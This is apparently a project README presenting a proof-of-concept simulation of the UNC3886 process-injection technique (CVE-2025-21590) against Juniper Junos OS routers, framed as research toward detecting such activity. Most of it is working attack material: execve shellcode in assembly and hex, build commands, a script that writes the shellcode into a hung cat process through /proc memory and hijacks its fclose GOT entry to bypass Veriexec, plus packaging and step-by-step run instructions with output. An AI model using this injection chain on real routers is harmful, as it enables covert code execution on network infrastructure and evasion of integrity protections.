# straycat

UNC3886 simulation - CVE-2025-21590. Using vJunos-router-23.2R1.15.

## Description

This is a simulation of the China-Nexus Espionage Actor UNC3886 process injection technique used against Juniper Networks Junos OS routers. Treat it as a proof of concept (PoC) for research only.

Junos OS by Juniper Networks is a proprietary operating system that's powering most Juniper routing, switching, and security devices.

Junos OS has Veriexec (a modified version of NetBSD Veriexec Subsystem). It is a kernel-based file integrity subsystem that protects the OS against unknown binaries, libraries, and scripts.

To bypass Veriexec, the execution of untrusted code must be done in a trusted process context. In this case, a hanged cat binary. By the way, the technique seems to be patched on the last version of Junos OS.

## The minimal PoC

There are a few differences between the original exploit and this one. I didn't use the TINYSHELL backdoor so no C2 involved. Instead I used a simple shellcode to spawn a shell to play with the process injection technique against Junos OS routers in an attempt to find a way to log such activity.

### Why only the process injection?

I feel that attempting to detect tinyshell and command and control behaviour could be easily swapped with something else instead. So I feel the initial exploitation vectors are more promising for stronger detection but unfortunately harder to to detect.

### FreeBSD shellcode

```asm
.section .text
.globl _start
_start:
    xorq %rax, %rax
    pushq %rax
    movabs $0x68732f6e69622f2f, %rax
    pushq %rax
    movq %rsp, %rdi
    xorq %rax, %rax
    pushq %rax
    pushq %rdi
    movq %rsp, %rsi
    xorq %rdx, %rdx
    movb $59, %al
    syscall
```

#### Using a FreeBSD VM to compile the shellcode

Probably could've just used pwntools tho.

```Vagrantfile
Vagrant.configure("2") do |config|
  config.vm.box = "generic/freebsd12"
  config.vm.box_version = "4.3.12"
end
```

```bash
as execve.s -o execve.o
ld execve.o -o execve
objdump -d execve | awk '/^ / {for(i=2; i<=NF; i++) if ($i ~ /^[0-9a-f]{2}$/) printf "%s", $i}' | xxd -r -p > loader.bin

# 00000000  48 31 c0 50 48 b8 2f 2f  62 69 6e 2f 73 68 50 48  |H1.PH.//bin/shPH|
# 00000010  89 e7 48 31 c0 50 57 48  89 e6 48 31 d2 b0 3b 0f  |..H1.PWH..H1..;.|
# 00000020  05                                                |.|
# 00000021

# copying over as hex because I'm lazy to set up a shared folder
hexdump -v -e '16/1 "%02x " "\n"' loader.bin > loader.hex
```

### Packaging

Before writing this up, I tested against Ubuntu on aarch64 and x86_64 on VMs on my local machines. I had to extract the cat binary from the Junos OS to check some addresses.

```sh
#!/bin/sh

# straycat-freebsd.sh

PID=$1

BASE_ADDR=$(grep "/bin/cat" /proc/$PID/map | grep "r-x" | head -1 | awk '{print $1}' | cut -d'-' -f1 | sed 's/^0x//')

BASE_DEC=$(printf "%d" "0x$BASE_ADDR")

ENTRY_OFFSET=0x18e0 # .text section offset
GOT_OFFSET=0x20d078 # fclose@GOT offset

ENTRY_OFFSET_DEC=$(printf "%d" "$ENTRY_OFFSET")
GOT_OFFSET_DEC=$(printf "%d" "$GOT_OFFSET")

ENTRY_ADDR=$((BASE_DEC + ENTRY_OFFSET_DEC))
GOT_ADDR=$((BASE_DEC + GOT_OFFSET_DEC))

echo "[+] Base: 0x$(printf "%x" $BASE_DEC)"
echo "[+] Shellcode @ 0x$(printf "%x" $ENTRY_ADDR)"
echo "[+] Hijacking GOT @ 0x$(printf "%x" $GOT_ADDR)"

dd if=loader.bin of=/proc/$PID/mem bs=1 seek=$ENTRY_ADDR conv=notrunc 2>/dev/null

dd if=pc.bin of=/proc/$PID/mem bs=1 seek=$GOT_ADDR conv=notrunc 2>/dev/null
```

#### loader.bin and pc.bin

```sh
printf '\x50\x24\x20\x00\x00\x00\x00\x00' >pc.bin
cat loader.hex | xxd -r -p > loader.bin
```

#### pwn.tar.gz.b64

```sh
tar cvf pwn.tar.gz pc.bin loader.bin straycat-freebsd.sh
base64 pwn.tar.gz > pwn.tar.gz.b64
# copy pwn.tar.gz.b64 to the Junos OS VM
```

## Start two terminal windows of Junos OS virtual machine

```bash
ssh root@<ip>
mkfifo /tmp/null
cat /tmp/null
```

```bash
ssh root@<ip>
# copy pwn.tar.gz.b64 to the Junos OS VM
base64 -d pwn.tar.gz.b64 > pwn.tar.gz
tar xvf pwn.tar.gz
chmod +x straycat-freebsd.sh
ps aux | grep 'cat' | grep 'null' | awk '{print $2}'
# <PID>
sh ./straycat-freebsd.sh <PID>
# [+] Base: 0x202000
# [+] Shellcode @ 0x2038e0
# [+] Hijacking GOT @ 0x40f078
# trigger the shellcode
echo >/tmp/null
# shell should spawn on the other terminal
```

## References

- [Ghost in the Router: China-Nexus Espionage Actor UNC3886 Targets Juniper Routers | Google Cloud Blog](https://cloud.google.com/blog/topics/threat-intelligence/china-nexus-espionage-targets-juniper-routers)
